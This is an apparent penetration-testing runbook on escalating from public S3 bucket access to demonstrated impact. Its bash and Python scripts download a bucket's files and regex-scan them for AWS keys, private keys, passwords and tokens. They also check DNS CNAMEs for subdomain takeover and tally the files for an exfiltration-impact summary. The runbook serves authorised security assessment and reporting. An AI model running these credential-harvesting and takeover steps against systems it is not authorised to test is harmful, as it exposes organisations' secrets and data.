# Cloud Security — Runbook 04: Impact Escalation

## Purpose
Escalate from bucket access to demonstrable impact. Identify sensitive data, demonstrate attack chains, show subdomain takeover potential.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — evidence directory
- `$BUCKET_NAME` — vulnerable bucket name

---

## W4.1 — Scan bucket contents for secrets

```bash
BUCKET="$BUCKET_NAME"

# If bucket is listable, enumerate all files and scan for secrets
python3 -c "
import xml.etree.ElementTree as ET, urllib.request, sys, re

tree = ET.parse('$EVIDENCE_DIR/s3-full-listing.xml')
root = tree.getroot()
ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}

secrets_found = []
SECRET_PATTERNS = [
    r'(?i)(aws_access_key_id|aws_secret_access_key|AKIA[0-9A-Z]{16})',
    r'(?i)(-----BEGIN.*PRIVATE KEY-----)',
    r'(?i)(password|passwd|pwd)[\s]*[=:][\s]*[\x27\x22][^\x27\x22]+',
    r'(?i)(api[_-]?key|api[_-]?secret|auth[_-]?token)[\s]*[=:][\s]*[\x27\x22][^\x27\x22]+',
    r'(?i)(DATABASE_URL|DB_PASSWORD|DB_USER|MONGODB_URI)',
    r'(?i)(JWT_SECRET|SECRET_KEY|ENCRYPTION_KEY)',
]

for content in root.findall('.//s3:Contents', ns):
    key = content.find('s3:Key', ns).text
    size = int(content.find('s3:Size', ns).text)
    if size > 10*1024*1024:
        continue
    try:
        resp = urllib.request.urlopen(f'https://$BUCKET.s3.amazonaws.com/{key}')
        body = resp.read().decode('utf-8', errors='ignore')
        for pattern in SECRET_PATTERNS:
            matches = re.findall(pattern, body)
            for m in matches:
                secrets_found.append(f'{key}: {m[:100]}')
                print(f'[SECRET] {key}: {m[:100]}')
    except:
        pass

print(f'\\nTotal secrets found: {len(secrets_found)}')
" | tee "$EVIDENCE_DIR/impact-secrets-scan.txt"
```

## W4.2 — Demonstrate subdomain takeover via S3

```bash
BUCKET="$BUCKET_NAME"
TARGET_HOST=$(echo "$TARGET_URL" | awk -F/ '{print $3}')

# Check if this bucket matches a potential subdomain takeover
# Pattern: bucket name matches subdomain (e.g., assets.example.com -> assets S3 bucket)
echo "=== Subdomain Takeover Check ==="
echo "Bucket: $BUCKET"
echo "Target: $TARGET_HOST"

# Check if the bucket name could correspond to a DNS record
SUBDOMAIN_MATCH=$(echo "$BUCKET" | sed "s/-${TARGET_HOST%.*}-.*//")
echo "Potential matching subdomain: $BUCKET.$TARGET_HOST"

# Check DNS for this subdomain
dig +short "$BUCKET.$TARGET_HOST" CNAME 2>/dev/null > "$EVIDENCE_DIR/dns-cname.txt"
dig +short "$BUCKET.$TARGET_HOST" A 2>/dev/null > "$EVIDENCE_DIR/dns-a.txt"

if grep -q "s3.amazonaws.com" "$EVIDENCE_DIR/dns-cname.txt" 2>/dev/null; then
  echo "CONFIRMED: $BUCKET.$TARGET_HOST CNAMEs to S3 -- potential subdomain takeover"
  echo "If bucket is claimable/deletable, you can host arbitrary content on $BUCKET.$TARGET_HOST"
fi
```

## W4.3 — Demonstrate data exfiltration impact

```bash
BUCKET="$BUCKET_NAME"

# Count and categorize files
python3 -c "
import xml.etree.ElementTree as ET

tree = ET.parse('$EVIDENCE_DIR/s3-full-listing.xml')
root = tree.getroot()
ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}

categories = {'config': 0, 'database': 0, 'credentials': 0, 'source': 0, 'backup': 0, 'logs': 0, 'upload': 0, 'other': 0}
extensions = {}
total_size = 0
file_count = 0

for content in root.findall('.//s3:Contents', ns):
    key = content.find('s3:Key', ns).text.lower()
    size = int(content.find('s3:Size', ns).text)
    total_size += size
    file_count += 1

    ext = key.split('.')[-1] if '.' in key else 'none'
    extensions[ext] = extensions.get(ext, 0) + 1

    if any(k in key for k in ['.env', 'config', 'secret', 'credential', 'password', 'key']):
        categories['config'] += 1
    elif any(k in key for k in ['.sql', '.dump', 'database', 'mongodb', 'mongo']):
        categories['database'] += 1
    elif any(k in key for k in ['.pem', '.key', '.crt', '.jks']):
        categories['credentials'] += 1
    elif any(k in ext for k in ['py', 'js', 'ts', 'go', 'java', 'rb', 'php', 'c', 'cpp']):
        categories['source'] += 1
    elif any(k in key for k in ['backup', 'dump', 'export']):
        categories['backup'] += 1
    elif '.log' in key or key.endswith('.log'):
        categories['logs'] += 1
    elif any(k in key for k in ['upload', 'user-content', 'images', 'profile']):
        categories['upload'] += 1
    else:
        categories['other'] += 1

print(f'Total files: {file_count}')
print(f'Total size: {total_size/1024/1024:.1f} MB')
print(f'\\nCategories:')
for cat, count in categories.items():
    print(f'  {cat}: {count}')
print(f'\\nExtensions:')
for ext, count in sorted(extensions.items(), key=lambda x: x[1], reverse=True)[:10]:
    print(f'  .{ext}: {count}')
" > "$EVIDENCE_DIR/impact-file-analysis.txt"

cat "$EVIDENCE_DIR/impact-file-analysis.txt"
```

## W4.4 — Impact summary

```bash
cat > "$EVIDENCE_DIR/impact-summary.txt" << 'IMPACTOF'
Cloud Security Impact Analysis
===============================

S3 BUCKET PUBLIC ACCESS:
  - Public listing: Anyone can enumerate all files
  - Public read: Sensitive data exfiltration
  - Public write: Malware hosting, defacement, phishing
  - Severity: HIGH-CRITICAL (depending on content)

AZURE BLOB PUBLIC ACCESS:
  - Unauthenticated container listing + read
  - Potential for access key leakage in files
  - Severity: HIGH

GCP BUCKET PUBLIC ACCESS:
  - allUsers/allAuthenticatedUsers IAM role
  - Service account key leakage
  - Severity: HIGH

SUBDOMAIN TAKEOVER (cloud storage):
  - CNAME to deleted/claimable bucket
  - Host arbitrary content on target subdomain
  - Severity: HIGH

EVIDENCE FOUND:
IMPACTOF

cat "$EVIDENCE_DIR/impact-file-analysis.txt" >> "$EVIDENCE_DIR/impact-summary.txt"
cat "$EVIDENCE_DIR/impact-secrets-scan.txt" >> "$EVIDENCE_DIR/impact-summary.txt"

echo "Impact summary written to $EVIDENCE_DIR/impact-summary.txt"
```

---

## Evidence for Report

| Artifact | Capture |
|---|---|
| Bucket listing screenshot | Show XML/JSON listing in terminal |
| Sensitive file sample | First 500 chars of .env / config files |
| Secret scan results | grep output showing exposed keys |
| File categorization | Breakdown of file types in bucket |
| DNS CNAME record for takeover | dig output showing CNAME to cloud storage |

---

## Next Routing

| Result | Route |
|---|---|
| Secrets found in bucket | -> 05-evidence-collection.md (CRITICAL severity) |
| Sensitive files identified | -> 05-evidence-collection.md |
| Subdomain takeover possible | -> 05-evidence-collection.md |
| Only public web assets, no secrets | -> 05-evidence-collection.md (low/info severity) |
